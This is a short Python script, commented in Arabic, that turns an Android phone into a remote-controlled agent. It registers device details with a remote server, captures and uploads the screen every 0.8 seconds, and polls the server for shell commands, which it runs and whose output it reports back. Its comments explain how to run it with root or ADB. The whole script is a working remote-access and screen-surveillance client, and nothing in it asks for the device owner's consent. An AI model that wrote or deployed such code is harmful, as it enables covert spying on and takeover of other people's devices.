import requests, uuid, subprocess, time, base64, os

SERVER  = "https://YOUR-APP.onrender.com"
AGENT_ID = str(uuid.uuid4())[:8]
HEADERS  = {"X-Key": "ضع-توكن-سرّي-هنا"}
TMP      = "/sdcard/.scr.png"

# ---- التشغيل بصلاحيات مرتفعة (adb أو root) ----
# من Pydroid العادي لن تعمل الشاشة/اللمس. الطرق الممكنة:
#   1) جهاز مروّت:  su -c "python script.py"
#   2) عبر ADB:     Termux + android-tools، ثم adb shell
def sh(cmd):
    return subprocess.getoutput(cmd)

def register():
    info = {"os": sh("getprop ro.build.version.release"),
            "model": sh("getprop ro.product.model"),
            "user": sh("whoami")}
    requests.post(f"{SERVER}/register", json={"id": AGENT_ID, "info": info},
                  headers=HEADERS, timeout=15)

def send_screen():
    """يلتقط الشاشة ويرسلها كـ base64"""
    r = sh(f"screencap -p {TMP}")
    if not os.path.isfile(TMP):
        return
    with open(TMP, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()
    os.remove(TMP)
    requests.post(f"{SERVER}/result/{AGENT_ID}",
                  json={"type": "screen", "b64": b64},
                  headers=HEADERS, timeout=15)

def exec_cmd(cmd):
    out = sh(cmd)
    requests.post(f"{SERVER}/result/{AGENT_ID}",
                  json={"type": "out", "cmd": cmd, "out": out},
                  headers=HEADERS, timeout=15)

def main():
    register()
    print(f"[+] Agent online: {AGENT_ID}")
    last_shot = 0
    while True:
        try:
            # بث الشاشة كل 0.8 ثانية
            if time.time() - last_shot > 0.8:
                send_screen()
                last_shot = time.time()

            r = requests.get(f"{SERVER}/task/{AGENT_ID}",
                             headers=HEADERS, timeout=10).json()
            if r.get("cmd"):
                exec_cmd(r["cmd"])
        except Exception:
            pass
        time.sleep(0.2)

if __name__ == "__main__":
    main()
